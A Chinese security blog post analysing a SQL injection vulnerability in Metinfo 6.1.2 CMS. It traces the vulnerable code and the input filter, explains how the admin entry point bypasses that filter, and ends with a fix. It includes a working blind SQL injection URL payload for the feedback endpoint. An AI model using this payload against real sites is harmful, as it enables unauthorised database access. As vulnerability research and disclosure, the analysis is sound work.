


	<!DOCTYPE html>
	<html>
		

<head>
	<title>SQL注入漏洞分析</title>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="apple-mobile-web-app-title" content="Amaze UI" />
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
    <meta name="author" content="">
    <meta name="keywords" content="" />
    <meta name="description" content="" />
   	<!-- css -->
	<link rel="stylesheet" href="/css/style.css">

	<!-- favicon -->
	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
	
	<!-- font-awesome -->
		
	<link rel="stylesheet" href="/css/font-awesome.min.css">
	
</head>
	<body>	
		<!--Preloader-->
<div id="preloader">
	<div id="status">
		<img alt="PRELOADER" src="/img/logo.png">
	</div>
</div>
<!--Preloader end-->

<!-- header -->

	<header id="header-bg-1" style="background-image: url( /img/1.jpg );">	

	
		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
	
	
	
	<!-- current page name or title -->
	
		
		
			
			<p class=page-name>当前文章&nbsp;:&nbsp;《SQL注入漏洞分析》</p>
			
		
	
	
	<!-- others: such as change-bg, time... -->
	<p class="page-name-other">
		10/27/2018 
		<style type="text/css">
	header:after {
		content: '';
		position: relative;
		top: 0;
		left: 0;
		height: 100%;
		width: 100%;
		background: #222222;
		opacity: .5;
		z-index: -1;
	}
	
	.change-header-bg{
		font-style: normal;
	}
	.change-header-bg i{
		text-align: center;
		cursor: pointer;
		pointer-events: bounding-box;
	}
	@media(max-width:512px) {
		.change-header-bg {
			display: none;
			visibility: hidden;
		}
	}
	
</style>

	</p>		
</header>

<!-- nav -->
<div id="cd-nav">
	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>

	<nav id="cd-main-nav">
		<ul>
			
      		<li class="fa fa-/">
           		<a href="/" title="主页">主页</a>	
      		</li>
    		
      		<li class="fa fa-/archives">
           		<a href="/archives" title="归档">归档</a>	
      		</li>
    		
      		<li class="fa fa-/categories">
           		<a href="/categories" title="分类">分类</a>	
      		</li>
    		
      		<li class="fa fa-/tags">
           		<a href="/tags" title="标签">标签</a>	
      		</li>
    		
    		
        	
		</ul>
	</nav>
</div>

		<!--main-->
		<main> 
		<div class="page-container">
		<!-- content srart -->
<div class="am-g am-g-fixed blog-fixed blog-content">
	<div class="am-u-md-8 am-u-sm-12">

		<article class="am-article blog-article-p">

			<div class="am-article-hd">
				

				<h1 class="am-article-title blog-text-center">
					
					
	
		<a href="/2018/10/27/SQL注入漏洞分析/" itemprop="url">		
			SQL注入漏洞分析		
		</a>
	

				</h1>

				<p class="am-article-meta blog-text-center">
					<span>
						<i class="fa fa-clock-o"></i> 
						<a href="/2018/10/27/SQL注入漏洞分析/" itemprop="url">
	<time datetime="2018-10-27T07:59:55.000Z" itemprop="datePublished">
  		2018-10-27
  </time>
</a>    
&nbsp;
					</span>
					
					<span>						
						
							<i class="fa fa-tags"></i>
							
								<a href="#SQL注入" title="SQL注入" rel="1">SQL注入</a>&nbsp;
													 											
						
					</span>
				</p>
			</div>

			<div class="am-article-bd">
				<div class="content" id="post-content">
					
						<h2 id="分享-Metinfo-6-1-2-SQL注入漏洞分析"><a href="#分享-Metinfo-6-1-2-SQL注入漏洞分析" class="headerlink" title="分享 | Metinfo 6.1.2 SQL注入漏洞分析"></a>分享 | Metinfo 6.1.2 SQL注入漏洞分析</h2><p>原创： 一秋网络科技 <a href="javascript:void(0" target="_blank" rel="noopener">一秋网络科技</a>;) <em>1周前</em></p>
<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Metinfo 米拓企业建站系统是一款适合企业网站建设的开源CMS系统,近期互联网上公开爆出 Metinfo 6.1.2 版本存在SQL注入漏洞，随后一秋网络安全团队对其漏洞进行了复现与分析。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞触发的代码在 <code>/app/system/message/web/message.class.php</code> 文件 第37行，<code>add</code>方法部分。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($info)</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>        <span class="keyword">global</span> $_M;</span><br><span class="line"> <span class="number">3</span>        <span class="keyword">if</span>(!$_M[form][id])&#123;</span><br><span class="line"> <span class="number">4</span>           $message=DB::get_one(<span class="string">"select * from &#123;$_M[table][column]&#125; where module= 7 and lang ='&#123;$_M[form][lang]&#125;'"</span>);</span><br><span class="line"> <span class="number">5</span>           $_M[form][id]=$message[id];</span><br><span class="line"> <span class="number">6</span>        &#125;</span><br><span class="line"> <span class="number">7</span>        $met_fd_ok=DB::get_one(<span class="string">"select * from &#123;$_M[table][config]&#125; where lang ='&#123;$_M[form][lang]&#125;' and  name= 'met_fd_ok' and columnid = &#123;$_M[form][id]&#125;"</span>);</span><br><span class="line"> <span class="number">8</span>        $_M[config][met_fd_ok]= $met_fd_ok[value];</span><br><span class="line"> <span class="number">9</span>        <span class="keyword">if</span>(!$_M[config][met_fd_ok])okinfo(<span class="string">'javascript:history.back();'</span>,<span class="string">"&#123;$_M[word][Feedback5]&#125;"</span>);</span><br><span class="line"><span class="number">10</span>        <span class="keyword">if</span>($_M[config][met_memberlogin_code])&#123;</span><br><span class="line"><span class="number">11</span>            <span class="keyword">if</span>(!load::sys_class(<span class="string">'pin'</span>, <span class="string">'new'</span>)-&gt;check_pin($_M[<span class="string">'form'</span>][<span class="string">'code'</span>]))&#123;</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">13</span>                        okinfo(<span class="number">-1</span>, $_M[<span class="string">'word'</span>][<span class="string">'membercode'</span>]);</span><br><span class="line"><span class="number">14</span>            &#125;</span><br><span class="line"><span class="number">15</span>        &#125;</span><br></pre></td></tr></table></figure>
<p>从上述代码分析发现  <code>$met_fd_ok=DB::get_one(&quot;select * from {$_M[table][config]} where lang =&#39;{$_M[form][lang]}&#39; and  name= &#39;met_fd_ok&#39; and columnid = {$_M[form][id]}&quot;);</code> 语句中 <code>{$_M[form][id]}</code> 参数，没有用单引号引起来判断此处应该有SQL注入漏洞。</p>
<p>直接拼接SQL 注入payload发现，注入的payload被过滤，无法直接进行SQL注入。继续往下分析。</p>
<p>继续分析发现 <code>message.class.php</code> 文件 调用了 <code>class feedback extends web</code>  父类初始化函数，跟进web类。</p>
<p>web类定义在  <code>/app/system/include/class/web.class.php</code> 文件。分析web类，没有发现对参数进行过滤的函数，但是发现初始化了 <code>common</code>类。 跟进<code>common</code>类，定义在<code>/app/system/include/class/common.class.php</code>文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>        <span class="keyword">global</span> $_M;<span class="comment">//全局数组$_M</span></span><br><span class="line"> <span class="number">3</span>        ob_start();<span class="comment">//开启缓存</span></span><br><span class="line"> <span class="number">4</span>        <span class="keyword">$this</span>-&gt;load_mysql();<span class="comment">//数据库连接</span></span><br><span class="line"> <span class="number">5</span>        <span class="keyword">$this</span>-&gt;load_form();<span class="comment">//表单过滤</span></span><br><span class="line"> <span class="number">6</span>        <span class="keyword">$this</span>-&gt;load_lang();<span class="comment">//加载语言配置</span></span><br><span class="line"> <span class="number">7</span>        <span class="keyword">$this</span>-&gt;load_config_global();<span class="comment">//加载全站配置数据</span></span><br><span class="line"> <span class="number">8</span>        <span class="keyword">$this</span>-&gt;load_url_site();</span><br><span class="line"> <span class="number">9</span>        <span class="keyword">$this</span>-&gt;load_config_lang();<span class="comment">//加载当前语言配置数据</span></span><br><span class="line"><span class="number">10</span>        <span class="keyword">$this</span>-&gt;load_url();<span class="comment">//加载url数据</span></span><br><span class="line"><span class="number">11</span>    &#125;</span><br></pre></td></tr></table></figure>
<p>发现问题关键点，<code>$this-&gt;load_form();//表单过滤</code>,继续跟进<code>$this-&gt;load_form();</code>函数。</p>
<p>在<code>/app/system/include/class/common.class.php</code>文件51行、</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">load_form</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>        <span class="keyword">global</span> $_M;</span><br><span class="line"> <span class="number">3</span>        $_M[<span class="string">'form'</span>] =<span class="keyword">array</span>();</span><br><span class="line"> <span class="number">4</span>        <span class="keyword">isset</span>($_REQUEST[<span class="string">'GLOBALS'</span>]) &amp;&amp; <span class="keyword">exit</span>(<span class="string">'Access Error'</span>);</span><br><span class="line"> <span class="number">5</span>        <span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line"> <span class="number">6</span>            $_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $_M[<span class="string">'form'</span>][$_key] = daddslashes($_value);</span><br><span class="line"> <span class="number">7</span>        &#125;</span><br><span class="line"> <span class="number">8</span>        <span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line"> <span class="number">9</span>            $_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $_M[<span class="string">'form'</span>][$_key] = daddslashes($_value);</span><br><span class="line"><span class="number">10</span>        &#125;</span><br><span class="line"><span class="number">11</span>        <span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line"><span class="number">12</span>            $_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $_M[<span class="string">'form'</span>][$_key] = daddslashes($_value);</span><br><span class="line"><span class="number">13</span>        &#125;</span><br><span class="line"><span class="number">14</span>        <span class="keyword">if</span>(is_numeric($_M[<span class="string">'form'</span>][<span class="string">'lang'</span>]))&#123;<span class="comment">//伪静态兼容</span></span><br><span class="line"><span class="number">15</span>            $_M[<span class="string">'form'</span>][<span class="string">'page'</span>] = $_M[<span class="string">'form'</span>][<span class="string">'lang'</span>];</span><br><span class="line"><span class="number">16</span>            $_M[<span class="string">'form'</span>][<span class="string">'lang'</span>] = <span class="string">''</span>;</span><br><span class="line"><span class="number">17</span>        &#125;</span><br><span class="line"><span class="number">18</span>        <span class="keyword">if</span>($_M[<span class="string">'form'</span>][<span class="string">'metid'</span>] == <span class="string">'list'</span>)&#123;</span><br><span class="line"><span class="number">19</span>            $_M[<span class="string">'form'</span>][<span class="string">'list'</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="number">20</span>            $_M[<span class="string">'form'</span>][<span class="string">'metid'</span>] = $_M[<span class="string">'form'</span>][<span class="string">'page'</span>];</span><br><span class="line"><span class="number">21</span>            $_M[<span class="string">'form'</span>][<span class="string">'page'</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="number">22</span>        &#125;</span><br><span class="line"><span class="number">23</span>        <span class="keyword">if</span>(!preg_match(<span class="string">'/^[0-9A-Za-z]+$/'</span>, $_M[<span class="string">'form'</span>][<span class="string">'lang'</span>]) &amp;&amp; $_M[<span class="string">'form'</span>][<span class="string">'lang'</span>])&#123;</span><br><span class="line"><span class="number">24</span>            <span class="keyword">echo</span> <span class="string">"No data in the database,please reinstall."</span>;</span><br><span class="line"><span class="number">25</span>            <span class="keyword">die</span>();</span><br><span class="line"><span class="number">26</span>        &#125;</span><br><span class="line"><span class="number">27</span>    &#125;</span><br></pre></td></tr></table></figure>
<p>这里看到把 POST、GET、COOKIE 传递过来的参数用<code>daddslashes</code>进行了全局过滤。跟进<code>daddslashes</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> 1function daddslashes($string, $force = 0) &#123;</span><br><span class="line"> 2    !defined(&apos;MAGIC_QUOTES_GPC&apos;) &amp;&amp; define(&apos;MAGIC_QUOTES_GPC&apos;, get_magic_quotes_gpc());</span><br><span class="line"> 3    if(!MAGIC_QUOTES_GPC || $force) &#123;</span><br><span class="line"> 4        if(is_array($string)) &#123;</span><br><span class="line"> 5            foreach($string as $key =&gt; $val) &#123;</span><br><span class="line"> 6                $string[$key] = daddslashes($val, $force);</span><br><span class="line"> 7            &#125;</span><br><span class="line"> 8        &#125; else &#123;</span><br><span class="line"> 9            if(!defined(&apos;IN_ADMIN&apos;))&#123;</span><br><span class="line">10                $string = trim(addslashes(sqlinsert($string)));</span><br><span class="line">11            &#125;else&#123;</span><br><span class="line">12                $string = trim(addslashes($string));</span><br><span class="line">13            &#125;</span><br><span class="line">14        &#125;</span><br><span class="line">15    &#125;</span><br><span class="line">16    return $string;</span><br><span class="line">17&#125;</span><br></pre></td></tr></table></figure>
<p>这里判断是否开启了get_magic_quotes_gpc() ，如果没开启或者 <code>$force</code>不为空就进入下面的逻辑。有判断了是否定义<code>IN_ADMIN</code> 常量，如果没有定义就进入 <code>$string = trim(addslashes(sqlinsert($string)));</code>,从代码逻辑发现我们第一步进行SQL注入，失败是因为注入的payload被过滤导致，那么我们传递的值应该就是进入了这个过滤，用<code>sqlinsert</code>函数进行了过滤。</p>
<p>看一下<code>sqlinsert</code>函数是怎么进行的过滤。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> 1function sqlinsert($string)&#123;</span><br><span class="line"> 2    if(is_array($string))&#123;</span><br><span class="line"> 3        foreach($string as $key =&gt; $val) &#123;</span><br><span class="line"> 4            $string[$key] = sqlinsert($val);</span><br><span class="line"> 5        &#125;</span><br><span class="line"> 6    &#125;else&#123;</span><br><span class="line"> 7        $string_old = $string;</span><br><span class="line"> 8        $string = str_ireplace(&quot;\\&quot;,&quot;/&quot;,$string);</span><br><span class="line"> 9        $string = str_ireplace(&quot;\&quot;&quot;,&quot;/&quot;,$string);</span><br><span class="line">10        $string = str_ireplace(&quot;&apos;&quot;,&quot;/&quot;,$string);</span><br><span class="line">11        $string = str_ireplace(&quot;*&quot;,&quot;/&quot;,$string);</span><br><span class="line">12        $string = str_ireplace(&quot;%5C&quot;,&quot;/&quot;,$string);</span><br><span class="line">13        $string = str_ireplace(&quot;%22&quot;,&quot;/&quot;,$string);</span><br><span class="line">14        $string = str_ireplace(&quot;%27&quot;,&quot;/&quot;,$string);</span><br><span class="line">15        $string = str_ireplace(&quot;%2A&quot;,&quot;/&quot;,$string);</span><br><span class="line">16        $string = str_ireplace(&quot;~&quot;,&quot;/&quot;,$string);</span><br><span class="line">17        $string = str_ireplace(&quot;select&quot;, &quot;\sel\ect&quot;, $string);</span><br><span class="line">18        $string = str_ireplace(&quot;insert&quot;, &quot;\ins\ert&quot;, $string);</span><br><span class="line">19        $string = str_ireplace(&quot;update&quot;, &quot;\up\date&quot;, $string);</span><br><span class="line">20        $string = str_ireplace(&quot;delete&quot;, &quot;\de\lete&quot;, $string);</span><br><span class="line">21        $string = str_ireplace(&quot;union&quot;, &quot;\un\ion&quot;, $string);</span><br><span class="line">22        $string = str_ireplace(&quot;into&quot;, &quot;\in\to&quot;, $string);</span><br><span class="line">23        $string = str_ireplace(&quot;load_file&quot;, &quot;\load\_\file&quot;, $string);</span><br><span class="line">24        $string = str_ireplace(&quot;outfile&quot;, &quot;\out\file&quot;, $string);</span><br><span class="line">25        $string = str_ireplace(&quot;sleep&quot;, &quot;\sle\ep&quot;, $string);</span><br><span class="line">26        $string = strip_tags($string);</span><br><span class="line">27        if($string_old!=$string)&#123;</span><br><span class="line">28            $string=&apos;&apos;;</span><br><span class="line">29        &#125;</span><br><span class="line">30        $string = trim($string);</span><br><span class="line">31    &#125;</span><br><span class="line">32    return $string;</span><br><span class="line">33&#125;</span><br></pre></td></tr></table></figure>
<p>利用这个SQL注入前提是绕过<code>sqlinsert</code>函数的过滤，绕过过滤不是很难就不详细解释。</p>
<p>回到上面的代码，进入这个逻辑要满足<code>IN_ADMIN</code> 常量已被定义。 跟踪 <code>IN_ADMIN</code> 常量。</p>
<p>在<code>/admin/index.php</code>文件中进行了定义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> 1define(&apos;IN_ADMIN&apos;, true);</span><br><span class="line"> 2//接口</span><br><span class="line"> 3$M_MODULE=&apos;admin&apos;;</span><br><span class="line"> 4if(@$_GET[&apos;m&apos;])$M_MODULE=$_GET[&apos;m&apos;];</span><br><span class="line"> 5if(@!$_GET[&apos;n&apos;])$_GET[&apos;n&apos;]=&quot;index&quot;;</span><br><span class="line"> 6if(@!$_GET[&apos;c&apos;])$_GET[&apos;c&apos;]=&quot;index&quot;;</span><br><span class="line"> 7if(@!$_GET[&apos;a&apos;])$_GET[&apos;a&apos;]=&quot;doindex&quot;;</span><br><span class="line"> 8@define(&apos;M_NAME&apos;, $_GET[&apos;n&apos;]);</span><br><span class="line"> 9@define(&apos;M_MODULE&apos;, $M_MODULE);</span><br><span class="line">10@define(&apos;M_CLASS&apos;, $_GET[&apos;c&apos;]);</span><br><span class="line">11@define(&apos;M_ACTION&apos;, $_GET[&apos;a&apos;]);</span><br><span class="line">12require_once &apos;../app/system/entrance.php&apos;;</span><br></pre></td></tr></table></figure>
<p>从上述代码发现 ,漏洞函数是add并且不带do，于是找到 do开头的函数。经过查找在<code>/app/system/message/web/message.class.php</code>文件找到了<code>domessage</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 1 public function domessage() &#123;</span><br><span class="line"> 2        global $_M;</span><br><span class="line"> 3        if($_M[&apos;form&apos;][&apos;action&apos;] == &apos;add&apos;)&#123;</span><br><span class="line"> 4            $this-&gt;check_field();</span><br><span class="line"> 5            $this-&gt;add($_M[&apos;form&apos;]);</span><br><span class="line"> 6</span><br><span class="line"> 7        &#125;else&#123;</span><br><span class="line"> 8            $classnow = $this-&gt;input_class();</span><br><span class="line"> 9            $data = load::sys_class(&apos;label&apos;, &apos;new&apos;)-&gt;get(&apos;column&apos;)-&gt;get_column_id($classnow);</span><br><span class="line">10            $this-&gt;check($data[&apos;access&apos;]);</span><br><span class="line">11            unset($data[&apos;id&apos;]);</span><br><span class="line">12            $this-&gt;add_array_input($data);</span><br><span class="line">13            $this-&gt;seo($data[&apos;name&apos;], $data[&apos;keywords&apos;], $data[&apos;description&apos;]);</span><br><span class="line">14            $this-&gt;seo_title($data[&apos;ctitle&apos;]);</span><br><span class="line">15            $this-&gt;add_input(&apos;list&apos;, 1);</span><br><span class="line">16            require_once $this-&gt;template(&apos;tem/message_index&apos;, $this-&gt;input);</span><br><span class="line">17        &#125;</span><br><span class="line">18  &#125;</span><br></pre></td></tr></table></figure>
<p>至此我们已经分析完了Metinfo 6.1.2 SQL注入漏洞参数的整个流程。</p>
<h2 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h2><p>SQL注入点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1//admin/index.php?m=web&amp;n=message&amp;c=message&amp;a=domessage&amp;action=add&amp;lang=cn&amp;para137=1&amp;para186=1&amp;para138=1&amp;para139=1&amp;para140=1&amp;id=42</span><br></pre></td></tr></table></figure>
<p>SQL盲注 payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1//admin/index.php?m=web&amp;n=message&amp;c=message&amp;a=domessage&amp;action=add&amp;lang=cn&amp;para137=1&amp;para186=1&amp;para138=1&amp;para139=1&amp;para140=1&amp;id=42 and(ascii(substr((select database()),1,1)))=109</span><br></pre></td></tr></table></figure>
<h2 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h2><p>修改文件：</p>
<p>/app/system/message/web/message.class.php</p>
<p><strong>修改前</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1$met_fd_ok=DB::get_one(&quot;select * from &#123;$_M[table][config]&#125; where lang =&apos;&#123;$_M[form][lang]&#125;&apos; and  name= &apos;met_fd_ok&apos; and columnid = &#123;$_M[form][id]&#125;&quot;);</span><br></pre></td></tr></table></figure>
<p><strong>修改后</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1$met_fd_ok=DB::get_one(&quot;select * from &#123;$_M[table][config]&#125; where lang =&apos;&#123;$_M[form][lang]&#125;&apos; and  name= &apos;met_fd_ok&apos; and columnid = ‘&#123;$_M[form][id]&#125;’&quot;);</span><br></pre></td></tr></table></figure>
<p><strong>官网已发布最新版本6.1.3修复此漏洞，请及时下载升级。</strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/RAibE98zSc1oQHPMibJO5JHiaWicufZ3TTymFb0F8J1H4Jc4YFKicDLdT29mFL43v7KJL22myUyupxdAr3vPhyf6EKA/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p>

					
				</div>
			</div>
		</article>

		<ul class="am-pagination">
    
	
		<li class="am-pagination-next">
		<a class="pull-right" href="/2018/10/26/渗透课堂/" title="渗透课堂">
			下一篇 &raquo;
		</a>
		</li>
	 
 </ul>
        

		
		
		<!--
	时间：2018-09-24
	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
-->

	
		<aside class="post-widget">
			<nav class="post-toc-wrap" id="post-toc">
				
					<strong>文章目录</strong>
				
				
				<!--toc(post.content)-->
				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分享-Metinfo-6-1-2-SQL注入漏洞分析"><span class="post-toc-text">分享 | Metinfo 6.1.2 SQL注入漏洞分析</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞简介"><span class="post-toc-text">漏洞简介</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞分析"><span class="post-toc-text">漏洞分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞证明"><span class="post-toc-text">漏洞证明</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞修复方案"><span class="post-toc-text">漏洞修复方案</span></a></li></ol>
			</nav>
			<div class="post-toc-bar"><div>
		</aside>
	

	</div>
</div>
		</div>
		</main>
		
		<!--footer-->
		<footer>
	<div class="blog-text-center">
		<div class="theme-annie-social">
						
				
					<a href="https://weibo.com/u/6692637186" title="Weibo" target="_blank"><i class="fa fa-weibo"></i>&nbsp;</a>
				
				
					<a href="mailto:sec@1qit.com" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
					
				
				
		</div>
	</div>

	<div  class="blog-text-center">
		<div class="theme-annie-copyright">
		吉林省一秋网络科技有限公司 吉ICP备17002063号-1
		</div>
	</div>

</footer>
		<script>
	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
</script>






	<script type="text/javascript" src="/js/toc.js"></script>


<script type="text/javascript" src="/js/main.js"></script>

		
		<!--back to top-->
        <style type="text/css">
	#totop {
		background: white;
		border-radius: 50%;
		position: fixed;
		right: 5.4%;
		bottom: 80px;
		cursor: pointer;
	}
	
	#totop a {
		color: #474747;
		background-color: transparent;
		padding: 10px;
		text-decoration: none;
	}
	
	@media(max-width:512px) {
		#totop {
			display: none;
			visibility: hidden;
		}
	}
</style>


	<div id="totop">
  		<a href="javascript:;" class="fa fa-arrow-up"></a>
	</div>

	</body>
	</html>

